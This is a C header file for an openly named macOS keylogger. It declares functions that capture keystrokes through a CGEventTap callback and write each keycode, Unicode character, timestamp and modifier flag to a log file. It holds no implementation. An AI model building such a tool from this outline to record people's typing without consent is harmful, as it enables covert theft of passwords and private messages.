//  KeyLogger.h
//
//  Created by Juha Koivisto on 27.2.2011.
//  Copyright 2011 J. Koivisto S.A.C. All rights reserved.
//
//	Modified by Yoshiki Vazquez Baeza on October 22, 2013
//

#ifndef osxkeylogger_KeyLogger_h
#define osxkeylogger_KeyLogger_h


#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

void readLogFileName(char* pLogFileName2);

FILE* openLogFile();

void printToLog(CGEventTimestamp*	pTimeStamp,
				uint*				pType,
				long long*			pKeycode,
				UniChar*			pUc,
				UniCharCount*		pUcc,
				CGEventFlags*		pFlags,
				FILE*				pLogFile);

CGEventRef recordKeysCallback(CGEventTapProxy	proxy,
							  CGEventType		type,
							  CGEventRef		event,
							  void*				pLogFile);

void createEventListenerLoopSourceAndRun(FILE* pLogFile);


#endif
